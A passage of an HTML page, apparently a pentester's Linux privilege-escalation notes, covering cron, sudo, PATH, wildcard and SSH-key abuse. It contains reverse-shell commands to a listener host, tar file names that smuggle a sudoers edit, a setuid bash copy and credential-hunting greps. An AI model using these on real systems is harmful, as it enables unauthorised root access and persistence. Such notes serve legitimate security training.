@@ -1,0 +1,409 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Notes Linux Privilege Escalation" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="Check the Hacktricks checklist!" /><meta property="og:description" content="Check the Hacktricks checklist!" /><link rel="canonical" href="zeropio.github.io/notes/system/linux-privilege-escalation" /><meta property="og:url" content="zeropio.github.io/notes/system/linux-privilege-escalation" /><meta property="og:site_name" content="Zeropio’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-28T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes Linux Privilege Escalation" /><meta name="twitter:site" content="@ZeropioWasTaken" /><meta name="twitter:creator" content="@Zeropio" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio"},"dateModified":"2022-07-28T00:00:00+02:00","datePublished":"2022-07-28T00:00:00+02:00","description":"Check the Hacktricks checklist!","headline":"Notes Linux Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"zeropio.github.io/notes/system/linux-privilege-escalation"},"url":"zeropio.github.io/notes/system/linux-privilege-escalation"}</script><title>Notes | Linux Privilege Escalation | Zeropio's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Zeropio's Blog"><meta name="application-name" content="Zeropio's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Zeropio's Blog</a></div><div class="site-subtitle font-italic">CTF enjoyer and pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-lightbulb-o ml-xl-3 mr-xl-3 unloaded"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/zeropio" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/ZeropioWasTaken" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | Linux Privilege Escalation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | Linux Privilege Escalation</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1658959200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 28, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> zeropio </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2671 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><blockquote class="prompt-tip"><div><p>Check the <a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist">Hacktricks</a> checklist!</p></div></blockquote><hr /><h1 id="enumeration">Enumeration</h1><p>Enumeration is the fundamental part for Privilege Escalation. We need the following information:</p><ul><li><strong>OS Version</strong><li><strong>Kernel Version</strong><li><strong>Running Services</strong><li><strong>Installed Packages and Versions</strong><li><strong>Logged in Users</strong><li><strong>User Home Directories</strong><li><strong>Sudo Privileges</strong><li>…</ul><p>There are some useful tools like:</p><ul><li><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum</a><li><a href="https://github.com/sleventyeleven/linuxprivchecker">LinuxPrivChecker</a><li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></ul><hr /><h1 id="kernel-exploits">Kernel Exploits</h1><p>Kernel level exploits exist for a variety of Linux kernel versions, for example <a href="https://github.com/dirtycow/dirtycow.github.io">DirtyCow</a>.</p><p>First, start checking the Linux OS Version:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-a</span> 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cat</span> /etc/lsb-release
+</pre></table></code></div></div><p>Search the OS Version on Internet to find exploits.</p><hr /><h1 id="vulnerable-services">Vulnerable Services</h1><p>Using the previous step, identify the programs on the target system. Check their version, usually with the flag <code class="language-plaintext highlighter-rouge">-v</code> and search on Internet for exploits. Also we can run <code class="language-plaintext highlighter-rouge">dpkg -l</code> to a fast check.</p><hr /><h1 id="cron-job-abuse">Cron Job Abuse</h1><p>The <code class="language-plaintext highlighter-rouge">crontab</code> command can create a cron file in:</p><ul><li><code class="language-plaintext filepath highlighter-rouge">/etc/crontab</code><li><code class="language-plaintext filepath highlighter-rouge">/etc/cron.d</code><li><code class="language-plaintext filepath highlighter-rouge">/var/spool/cron/crontabs/root</code><li><code class="language-plaintext filepath highlighter-rouge">/var/spool/cron</code>.</ul><p>Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry <code class="language-plaintext highlighter-rouge">0 */12 * * * /home/admin/backup.sh</code> would run every 12 hours. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs. Certain applications create cron files in the <code class="language-plaintext filepath highlighter-rouge">/etc/cron.d</code> directory and may be misconfigured to allow a non-root user to edit them.</p><p>Let’s look around the system for any writeable files or directories:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>find / <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-o</span>+w 2&gt;/dev/null
+</pre></table></code></div></div><p>Move to suspicious folders and inspect them:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> ./suspicious/
+</pre></table></code></div></div><p>If editing a script, make sure to <strong>ALWAYS</strong> take a copy of the script and/or create a backup of it. To append a reverse shell we can a simply line to a script as:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1
+</pre></table></code></div></div><p>Open a netcat listener and wait to connect. There are other ways. If in the <code class="language-plaintext filepath highlighter-rouge">/etc/crontab</code> we have the PATH with the <code class="language-plaintext filepath highlighter-rouge">/home/user</code> we can create the following script in the home:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="go">
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+</span></pre></table></code></div></div><p>We need to give execution permission and wait to the crontab to execute the file. Then do</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>/tmp/rootbash <span class="nt">-p</span>
+</pre></table></code></div></div><hr /><h1 id="special-permissions">Special Permissions</h1><h2 id="setuid-bit"><span class="mr-2">Setuid Bit</span><a href="#setuid-bit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The <strong>Set User ID upon Execution</strong> (<strong>setuid</strong>) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an <code class="language-plaintext highlighter-rouge">s</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</pre></table></code></div></div><p>It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. The <strong>Set-Group-ID</strong> (<strong>setgid</strong>) permission is another special permission that allows us to run binaries as if we were part of the group that created them.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-6000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</pre></table></code></div></div><h2 id="gtfobins"><span class="mr-2">GTFOBins</span><a href="#gtfobins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This <a href="https://gtfobins.github.io/">project</a> provides us a wide range of escalation privileges for Unix binaries. For example:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo </span>apt-get update <span class="nt">-o</span> APT::Update::Pre-Invoke::<span class="o">=</span>/bin/sh
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></pre></table></code></div></div><hr /><h1 id="sudo-right-abuse">Sudo Right Abuse</h1><p>Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the <strong>sudo</strong> command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in <code class="language-plaintext filepath highlighter-rouge">/etc/sudoers</code>. The first thing to do is running the following command:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+</pre></table></code></div></div><p>This will list all the privileges of our current user. If we see the option <code class="language-plaintext highlighter-rouge">NOPASSWD</code>, we can run the path next to it with other user privileges. Take for example we could run <strong>tcpdump</strong> with root privileges. We can start our privilage escalation:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/.test <span class="nt">-Z</span> root 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cat</span> /tmp/.test
+<span class="go">
+</span><span class="gp">rm /tmp/f;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.3 443 <span class="o">&gt;</span>/tmp/f
+<span class="go">
+</span><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo</span> /usr/sbin/tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> ens192 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/.test <span class="nt">-Z</span> root
+</pre></table></code></div></div><p>In a netcat we will receive the shell.</p><hr /><h1 id="path-abuse">Path Abuse</h1><p><strong>PATH</strong> is an environment variable that specifies the set of directories where an executable can be located. An account’s PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example running <code class="language-plaintext highlighter-rouge">cat</code> instead of <code class="language-plaintext highlighter-rouge">/bin/cat</code>. We can check it with <code class="language-plaintext highlighter-rouge">echo $PATH</code>. Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.</p><p>Adding <code class="language-plaintext highlighter-rouge">.</code> to a user’s PATH adds their current working directory to the list. For example, if we can modify a user’s path, we could replace a common binary such as <code class="language-plaintext highlighter-rouge">ls</code> with a malicious script such as a reverse shell. To modify the PATH.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="k">${</span><span class="nv">PATH</span><span class="k">}</span>
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">export </span>PATH
+</pre></table></code></div></div><p>Now, we can create a easy script:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'echo "PATH ABUSE!!"'</span> <span class="o">&gt;</span> <span class="nb">ls</span> 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="nb">ls</span> 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">
+PATH ABUSE!!
+</span></pre></table></code></div></div><hr /><h1 id="wildcard-abuse">Wildcard Abuse</h1><p>A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:</p><div class="table-wrapper"><table><thead><tr><th><strong>Character</strong><th><strong>Significance</strong><tbody><tr><td><code class="language-plaintext highlighter-rouge">*</code><td>An asterisk that can match any number of characters in a file name<tr><td><code class="language-plaintext highlighter-rouge">?</code><td>Matches a single character<tr><td><code class="language-plaintext highlighter-rouge">[ ]</code><td>Brackets enclose characters and can match any single one at the defined position<tr><td><code class="language-plaintext highlighter-rouge">~</code><td>user home directory or can have another username appended to refer to that user’s home director<tr><td><code class="language-plaintext highlighter-rouge">-</code><td>A hyphen within brackets will denote a range of characters</table></div><p>Let’s see an example with the command <code class="language-plaintext highlighter-rouge">tar</code>. We will use the following tar flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>man <span class="nb">tar</span>
+<span class="go">
+</span><span class="gp">&lt;SNIP&gt;</span><span class="w">
+</span><span class="go">Informative output
+       --checkpoint[=N]
+              Display progress messages every Nth record (default 10).
+
+       --checkpoint-action=ACTION
+              Run ACTION on each checkpoint.
+</span></pre></table></code></div></div><p>With a cronjob that make automatically backup copy from the <code class="language-plaintext filepath highlighter-rouge">/root</code> to <code class="language-plaintext filepath highlighter-rouge">/tmp</code>. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'echo "user ALL=(root) NOPASSWD: ALL" &gt;&gt; /etc/sudoers'</span> <span class="o">&gt;</span> root.sh
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh root.sh"</span> 
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
+</pre></table></code></div></div><p>Check that the files are created:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span> 
+<span class="go">
+-rw-rw-r--  1 user user    1 Aug 31 23:11 --checkpoint=1
+-rw-rw-r--  1 user user    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
+</span></pre></table></code></div></div><p>Once the cronjob run:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> 
+<span class="go">
+</span><span class="c">...
+</span><span class="go">User zero may run the following commands on pio:
+    (root) NOPASSWD: ALL
+</span></pre></table></code></div></div><hr /><h1 id="credential-hunting">Credential Hunting</h1><h2 id="searching-for-creds"><span class="mr-2">Searching for Creds</span><a href="#searching-for-creds" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>These may be found in configuration files (<strong>.conf</strong>, <strong>.config</strong>, <strong>.xml</strong>, etc.), shell scripts, a user’s bash history file, backup (<strong>.bak</strong>) files, within database files or even in text files. Don’t forget about <strong>Password Reuse</strong>. One example for SQL credentials:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cat </span>wp-config.php | <span class="nb">grep</span> <span class="s1">'DB_USER\|DB_PASSWORD'</span>
+</pre></table></code></div></div><p>We can search for config files:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>find / <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/proc/*"</span> <span class="nt">-iname</span> <span class="s2">"*config*"</span> <span class="nt">-type</span> f 2&gt;/dev/null
+</pre></table></code></div></div><h2 id="ssh-keys"><span class="mr-2">SSH Keys</span><a href="#ssh-keys" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Always check for SSH keys:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">ls</span> ~/.ssh
+</pre></table></code></div></div><p>To connect using the RSA:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">chmod </span>600 id_rsa
+<span class="gp">zero@pio$</span><span class="w"> </span>ssh user@&lt;ip&gt; <span class="nt">-i</span> id_rsa
+</pre></table></code></div></div><p>If we can write in the <code class="language-plaintext filepath highlighter-rouge">/.ssh/</code> we can write our public key inside the target machine, at <code class="language-plaintext filepath highlighter-rouge">/home/user/.ssh/authorized_keys</code>. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. First, create a new key. Copy the <code class="language-plaintext highlighter-rouge">key.pub</code> inside <code class="language-plaintext filepath highlighter-rouge">/root/.ssh/authorized_keys</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ssh-keygen <span class="nt">-f</span> keys
+<span class="go">
+</span><span class="gp">victim@machine$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB...SNIP...M= user@zeropio"</span> <span class="o">&gt;&gt;</span> /root/.ssh/authorized_keys
+<span class="go">
+</span><span class="gp">zero@pio$</span><span class="w"> </span>ssh root@10.10.10.10 <span class="nt">-i</span> key
+<span class="gp">root@remotehost$</span><span class="w"> 
+</span></pre></table></code></div></div><hr /><h1 id="shared-libraries">Shared Libraries</h1><p>It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. There are two types on Linux <strong>static libraries</strong> (with the extension <code class="language-plaintext highlighter-rouge">.a</code>) and <strong>dynamically linked shared object libraries</strong> (with the extension <code class="language-plaintext highlighter-rouge">.so</code>). Dynamic libraries can be modified to control the execution of the program that calls them.</p><p>There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the <code class="language-plaintext highlighter-rouge">-rpath</code> or <code class="language-plaintext highlighter-rouge">-rpath-link</code> flags when compiling a program, using the environmental variables <strong>LD_RUN_PATH</strong> or <strong>LD_LIBRARY_PATH</strong>, placing libraries in the <code class="language-plaintext filepath highlighter-rouge">/lib</code> or <code class="language-plaintext filepath highlighter-rouge">/usr/lib</code> default directories, or specifying another directory containing the libraries within the <code class="language-plaintext filepath highlighter-rouge">/etc/ld.so.conf</code> configuration file. Additionally, the <strong>LD_PRELOAD</strong> environment variable can load a library before executing a binary. The shared objects required by a binary can be viewed using the <code class="language-plaintext highlighter-rouge">ldd</code> utility:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ldd /bin/ls
+<span class="go">
+</span><span class="gp">	linux-vdso.so.1 =&gt;</span><span class="w">  </span><span class="o">(</span>0x00007fff03bc7000<span class="o">)</span>
+<span class="gp">	libselinux.so.1 =&gt;</span><span class="w"> </span>/lib/x86_64-linux-gnu/libselinux.so.1 <span class="o">(</span>0x00007f4186288000<span class="o">)</span>
